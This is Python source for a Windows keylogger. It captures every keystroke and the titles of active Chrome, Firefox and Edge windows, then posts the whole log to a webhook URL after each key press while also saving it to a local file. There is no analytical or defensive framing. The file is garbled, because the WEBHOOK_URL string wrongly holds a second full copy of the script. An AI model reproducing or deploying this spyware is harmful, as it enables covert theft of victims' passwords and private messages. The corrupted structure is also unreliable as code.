import pynput
from pynput.keyboard import Key, Listener
import datetime
import json
import os
import win32gui  # For Windows active window title
from time import sleep
import requests  # For sending data to webhook

# Log file path for backup
LOG_FILE = "keylog.json"

# Webhook URL for sending data (replace with your actual webhook URL)
WEBHOOK_URL = "import pynput
from pynput.keyboard import Key, Listener
import datetime
import json
import os
import win32gui  # For Windows active window title
from time import sleep
import requests  # For sending data to webhook

# Log file path for backup
LOG_FILE = "keylog.json"

# Webhook URL for sending data (replace with your actual webhook URL)
WEBHOOK_URL = "https://your-webhook-url.com/log"

# Data structure
log_data = {
    "keystrokes": [],
    "browser_windows": []
}

# Load existing log if available
if os.path.exists(LOG_FILE):
    with open(LOG_FILE, 'r') as f:
        try:
            log_data = json.load(f)
        except:
            pass

# Save data to file as backup
def save_data():
    with open(LOG_FILE, 'w') as f:
        json.dump(log_data, f, indent=2)

# Send data to webhook
def send_to_webhook(data):
    try:
        response = requests.post(WEBHOOK_URL, json=data, timeout=5)
        if response.status_code != 200:
            print(f"Webhook send failed: {response.status_code}")
    except Exception as e:
        print(f"Webhook send error: {e}")
    # Save locally regardless of webhook success
    save_data()

# Capture active window (to detect browser)
def get_active_window():
    try:
        window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if any(browser in window_title for browser in ['Chrome', 'Firefox', 'Edge']):
            if not any(w['title'] == window_title for w in log_data["browser_windows"][-1:]):
                log_data["browser_windows"].append({
                    "time": datetime.datetime.now().isoformat(),
                    "title": window_title
                })
                send_to_webhook(log_data)
    except:
        pass

# Log keystrokes
def on_press(key):
    key_str = str(key)
    if key == Key.esc:
        key_str = "[Escape]"
    log_data["keystrokes"].append({
        "time": datetime.datetime.now().isoformat(),
        "key": key_str
    })
    get_active_window()
    send_to_webhook(log_data)

# Start listener
listener = Listener(on_press=on_press)
listener.start()

# Keep checking active window periodically
while True:
    get_active_window()
    sleep(5)  # Check every 5 seconds"

# Data structure
log_data = {
    "keystrokes": [],
    "browser_windows": []
}

# Load existing log if available
if os.path.exists(LOG_FILE):
    with open(LOG_FILE, 'r') as f:
        try:
            log_data = json.load(f)
        except:
            pass

# Save data to file as backup
def save_data():
    with open(LOG_FILE, 'w') as f:
        json.dump(log_data, f, indent=2)

# Send data to webhook
def send_to_webhook(data):
    try:
        response = requests.post(WEBHOOK_URL, json=data, timeout=5)
        if response.status_code != 200:
            print(f"Webhook send failed: {response.status_code}")
    except Exception as e:
        print(f"Webhook send error: {e}")
    # Save locally regardless of webhook success
    save_data()

# Capture active window (to detect browser)
def get_active_window():
    try:
        window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if any(browser in window_title for browser in ['Chrome', 'Firefox', 'Edge']):
            if not any(w['title'] == window_title for w in log_data["browser_windows"][-1:]):
                log_data["browser_windows"].append({
                    "time": datetime.datetime.now().isoformat(),
                    "title": window_title
                })
                send_to_webhook(log_data)
    except:
        pass

# Log keystrokes
def on_press(key):
    key_str = str(key)
    if key == Key.esc:
        key_str = "[Escape]"
    log_data["keystrokes"].append({
        "time": datetime.datetime.now().isoformat(),
        "key": key_str
    })
    get_active_window()
    send_to_webhook(log_data)

# Start listener
listener = Listener(on_press=on_press)
listener.start()

# Keep checking active window periodically
while True:
    get_active_window()
    sleep(5)  # Check every 5 seconds